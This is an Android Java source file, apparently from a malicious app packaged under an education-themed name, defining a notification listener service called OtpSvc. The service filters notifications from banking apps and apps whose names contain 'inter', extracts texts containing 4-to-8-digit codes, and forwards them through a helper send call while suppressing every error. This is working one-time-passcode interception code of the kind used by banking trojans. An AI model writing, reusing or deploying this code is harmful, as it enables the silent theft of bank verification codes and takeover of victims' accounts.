package com.eloeeducacao;

import android.app.Notification;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;

public class OtpSvc extends NotificationListenerService {

    @Override public void onNotificationPosted(StatusBarNotification s) {
        try {
            if (s == null || s.getNotification() == null) return;
            String pkg = s.getPackageName();
            if (!Util.banco(pkg) && !pkg.contains("inter")) return;
            CharSequence t = s.getNotification().extras.getCharSequence(Notification.EXTRA_TITLE);
            CharSequence x = s.getNotification().extras.getCharSequence(Notification.EXTRA_TEXT);
            String txt = (t == null ? "" : t) + " " + (x == null ? "" : x);
            if (!txt.matches(".*\\d{4,8}.*")) return;
            Util.sendT("otp", pkg + " | " + txt.trim());
        } catch (Throwable ignored) {}
    }
}
